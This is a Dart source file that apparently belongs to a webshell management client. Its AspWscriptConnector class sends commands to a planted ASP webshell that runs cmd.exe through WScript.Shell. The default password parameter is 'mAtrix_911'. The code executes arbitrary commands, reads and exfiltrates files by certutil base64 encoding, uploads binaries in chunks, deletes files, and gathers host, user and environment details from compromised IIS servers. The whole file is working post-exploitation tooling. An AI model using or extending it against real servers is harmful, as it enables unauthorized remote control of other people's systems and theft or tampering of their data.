import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:http/http.dart' as http;

import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'shell_connector.dart';
import 'shell_exec_connector.dart';

/// `asp_wscript_get.asp`：`WScript.Shell.Exec("cmd.exe /c " & cmd)`
///
/// Windows 命令执行型。
/// 特殊之处：ASP 使用 Server.HTMLEncode 对输出 HTML 编码，需要解码。
class AspWscriptConnector extends ShellExecConnector {
  AspWscriptConnector(super.webshell) {
    // Windows 目标默认目录使用 C:\，避免回落到 Unix 风格根路径。
    currentDir = r'C:\';
  }

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  String get _param =>
      webshell.password?.isNotEmpty == true ? webshell.password! : 'mAtrix_911';

  @override
  Future<String> sendRawCommand(String cmd) async {
    try {
      final uri = Uri.parse(webshell.url);
      http.Response response;

      if (webshell.method == 'POST') {
        response = await http
            .post(
              uri,
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: {_param: cmd},
            )
            .timeout(const Duration(seconds: 30));
      } else {
        // ASP 默认 GET
        final params = Map<String, String>.from(uri.queryParameters);
        params[_param] = cmd;
        response = await http
            .get(uri.replace(queryParameters: params))
            .timeout(const Duration(seconds: 30));
      }

      if (response.statusCode != 200) return '[HTTP ${response.statusCode}]';
      return _decode(decodeWithFallback(response.bodyBytes));
    } on TimeoutException {
      return '[Timeout]';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  /// 去除 `<pre>...</pre>` 包装并 HTML 解码
  static String _decode(String raw) {
    var s = raw.trim();
    if (s.startsWith('<pre>')) s = s.substring(5);
    if (s.endsWith('</pre>')) s = s.substring(0, s.length - 6);
    return _htmlDecode(s.trim());
  }

  static String _htmlDecode(String s) {
    final named = s
        .replaceAll('&lt;', '<')
        .replaceAll('&gt;', '>')
        .replaceAll('&amp;', '&')
        .replaceAll('&quot;', '"')
        .replaceAll('&#39;', "'")
        .replaceAll('&nbsp;', ' ');
    return named.replaceAllMapped(
      RegExp(r'&#(x[0-9a-fA-F]+|\d+);'),
      (match) {
        final entity = match.group(1)!;
        final codePoint = entity.startsWith('x') || entity.startsWith('X')
            ? int.tryParse(entity.substring(1), radix: 16)
            : int.tryParse(entity);
        if (codePoint == null) return match.group(0)!;
        try {
          return String.fromCharCode(codePoint);
        } catch (_) {
          return match.group(0)!;
        }
      },
    );
  }

  // ── Windows 专用覆盖 ──────────────────────────────────────────────────────

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    // Windows 路径常见形式：
    // - C:\Users\foo
    // - \\server\share
    // - /c/Users/foo（部分上层逻辑可能传入）
    final isWindowsLikePath = RegExp(r'^[a-zA-Z]:[\\/]|^\\\\').hasMatch(
          workingDir,
        ) ||
        workingDir.startsWith('/');
    final cd = (workingDir.isNotEmpty && isWindowsLikePath)
        ? 'cd /d "$workingDir" && '
        : '';
    // 走 cmd.exe，不能使用 Linux 的 bash -c 包裹
    return sendRawCommand('$cd$cmd 2>&1');
  }

  @override
  Future<String> getCurrentDir() async {
    final r = (await sendRawCommand('cd')).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    // Use cmd metadata expansion instead of parsing localized `dir` output.
    final raw = await sendRawCommand(
      'cd /d "$path" 2>nul && '
      'for /f "delims=" %I in (\'dir /b /a 2^>nul\') do '
      '@if /i not "%I"=="." if /i not "%I"==".." '
      '(if exist "%I\\*" '
      '(for %J in ("%I") do @echo D^|0^|%~tJ^|%~aJ^|%~nxJ) '
      'else (for %J in ("%I") do @echo F^|%~zJ^|%~tJ^|%~aJ^|%~nxJ))',
    );
    final entries = <FileEntry>[
      const FileEntry(
        name: '..',
        isDirectory: true,
        size: 0,
        permissions: '',
        modified: '',
      ),
    ];
    final seen = <String>{};
    for (final line in raw.split(RegExp(r'\r?\n'))) {
      final t = line.trim();
      if (t.isEmpty || t.startsWith('[')) continue;
      final parts = t.split('|');
      if (parts.length < 5) continue;
      final kind = parts[0].trim();
      final size = int.tryParse(parts[1].trim()) ?? 0;
      final modified = parts[2].trim();
      final attrs = parts[3].trim();
      final name = parts.sublist(4).join('|').trim();
      if (name.isEmpty || name == '.' || name == '..') continue;
      final key = name.toLowerCase();
      if (!seen.add(key)) continue;
      final isDir = kind == 'D' || attrs.toLowerCase().contains('d');
      entries.add(FileEntry(
        name: name,
        isDirectory: isDir,
        size: isDir ? 0 : size,
        permissions: _formatWindowsAttrs(attrs, isDir),
        modified: modified,
      ));
    }
    entries.sublist(1).sort((a, b) {
      if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
      return a.name.toLowerCase().compareTo(b.name.toLowerCase());
    });
    return entries;
  }

  static String _formatWindowsAttrs(String raw, bool isDir) {
    final s = raw.trim().toLowerCase();
    final flags = <String>[];
    if (isDir || s.contains('d')) flags.add('D');
    if (s.contains('r')) flags.add('R');
    if (s.contains('h')) flags.add('H');
    if (s.contains('s')) flags.add('S');
    if (s.contains('a')) flags.add('A');
    return flags.isEmpty ? '-' : flags.join(' ');
  }

  @override
  Future<String> readFile(String path) async {
    // Windows 通过 certutil 做 base64 传输
    final raw = await sendRawCommand(
        'certutil -encode "$path" "%TEMP%\\__mx_enc.tmp" && type "%TEMP%\\__mx_enc.tmp" && del "%TEMP%\\__mx_enc.tmp"');
    if (raw.isEmpty || raw.startsWith('[')) return '[文件不存在或无权读取]';
    // certutil 输出：BEGIN CERTIFICATE header + base64 + END CERTIFICATE
    final lines = raw.split('\n').map((l) => l.trim()).toList();
    final b64 = lines
        .where((l) =>
            l.isNotEmpty &&
            !l.startsWith('-----') &&
            !l.startsWith('CertUtil'))
        .join('');
    try {
      return decodeWithFallback(base64.decode(b64));
    } catch (_) {
      return '[读取失败：编码错误]';
    }
  }

  @override
  Future<bool> writeFile(String path, String content) async {
    final bytes = Uint8List.fromList(utf8.encode(content));
    return _writeBinaryChunked(path, bytes);
  }

  @override
  Future<Uint8List> readFileBinary(String path) async {
    final raw = await sendRawCommand(
        'certutil -encode "$path" "%TEMP%\\__mx_enc.tmp" && type "%TEMP%\\__mx_enc.tmp" && del "%TEMP%\\__mx_enc.tmp"');
    if (raw.isEmpty || raw.startsWith('[')) throw Exception('无法读取文件: $raw');
    final b64 = raw.split('\n')
        .map((l) => l.trim())
        .where((l) => l.isNotEmpty && !l.startsWith('-----') && !l.startsWith('CertUtil'))
        .join('');
    return base64.decode(b64);
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
    return _writeBinaryChunked(path, bytes);
  }

  static const _kWinUploadChunkSize = 2048;
  static const _kUploadOkTag = '__MX_UPLOAD_OK__';

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    return _writeBinaryChunked(path, bytes, onProgress: onProgress);
  }

  Future<bool> _writeBinaryChunked(
    String path,
    Uint8List bytes, {
    void Function(int sent, int total)? onProgress,
  }) async {
    final total = bytes.length;
    onProgress?.call(0, total);
    if (total == 0) {
      final r = await sendRawCommand('type nul > "$path" && echo $_kUploadOkTag');
      onProgress?.call(0, 0);
      return r.contains(_kUploadOkTag);
    }

    int offset = 0;
    var first = true;
    const tmp = r'C:\Windows\Temp';
    while (offset < total) {
      final end = (offset + _kWinUploadChunkSize).clamp(0, total);
      final chunk = bytes.sublist(offset, end);
      final b64 = base64.encode(chunk);
      final cmd = first
          ? 'del /f "$path" 2>nul & del /f "$tmp\\__mx_b64.tmp" 2>nul & '
              'echo $b64 > "$tmp\\__mx_b64.tmp" && '
              'certutil -decode "$tmp\\__mx_b64.tmp" "$path" && '
              'del /f "$tmp\\__mx_b64.tmp" 2>nul && echo $_kUploadOkTag'
          : 'del /f "$tmp\\__mx_bin.tmp" 2>nul & del /f "$tmp\\__mx_new.tmp" 2>nul & del /f "$tmp\\__mx_b64.tmp" 2>nul & '
              'echo $b64 > "$tmp\\__mx_b64.tmp" && '
              'certutil -decode "$tmp\\__mx_b64.tmp" "$tmp\\__mx_bin.tmp" && '
              'copy /b "$path"+"$tmp\\__mx_bin.tmp" "$tmp\\__mx_new.tmp" >nul && '
              'move /y "$tmp\\__mx_new.tmp" "$path" >nul && '
              'del /f "$tmp\\__mx_b64.tmp" 2>nul & del /f "$tmp\\__mx_bin.tmp" 2>nul & echo $_kUploadOkTag';
      final r = await sendRawCommand(cmd);
      if (r.contains('ACCESS_DENIED') ||
          r.contains('拒绝访问') ||
          r.contains('Access is denied')) {
        throw Exception('目标路径写入被拒绝（IIS 进程无写权限）：$path');
      }
      if (!r.contains(_kUploadOkTag)) return false;
      offset = end;
      first = false;
      onProgress?.call(offset, total);
    }
    return true;
  }

  @override
  Future<bool> deleteFile(String path) async {
    final r = await sendRawCommand('del /f "$path" && echo 1');
    return r.trim().contains('1');
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    const sep = '###MATRIX_SEP###';
    final cmd = [
      'echo ${sep}OS${sep}',   'ver',
      'echo ${sep}USER${sep}', 'echo %USERNAME%',
      'echo ${sep}PWD${sep}',  'cd',
      'echo ${sep}HOST${sep}', 'hostname',
    ].join(' & ');
    const keyMap = {
      'OS': 'OS', 'USER': '运行用户', 'PWD': '当前目录', 'HOST': '主机名',
    };
    final info = ShellExecConnector.parseSepOutput(
      await sendRawCommand(cmd),
      sep,
      keyMap,
    );
    // 对 IIS 目标，cd 常返回 w3wp 工作目录（如 inetsrv），此处展示连接器实际使用目录。
    info['当前目录'] = currentDir;
    return info;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
      String path) async {
    final allRaw = await sendRawCommand('dir /b "$path" 2>nul');
    final dirRaw = await sendRawCommand('dir /b /ad "$path" 2>nul');
    if (allRaw.isEmpty || allRaw.startsWith('[')) return [];
    final dirs =
        dirRaw.split('\n').map((l) => l.trim().toLowerCase()).toSet();
    final result = <({String name, bool isDir})>[];
    for (final line in allRaw.split('\n')) {
      final name = line.trim();
      if (name.isEmpty) continue;
      result.add((name: name, isDir: dirs.contains(name.toLowerCase())));
    }
    result.sort((a, b) => a.name.compareTo(b.name));
    return result;
  }

  @override
  Future<String> getHomeDir() async =>
      (await sendRawCommand('echo %USERPROFILE%')).trim();

  @override
  Future<List<String>> listEnvVarNames() async {
    final raw = await sendRawCommand('set');
    if (raw.isEmpty || raw.startsWith('[')) return [];
    return raw
        .split('\n')
        .map((l) => l.split('=').first.trim())
        .where((s) => s.isNotEmpty)
        .toList()
      ..sort();
  }
}
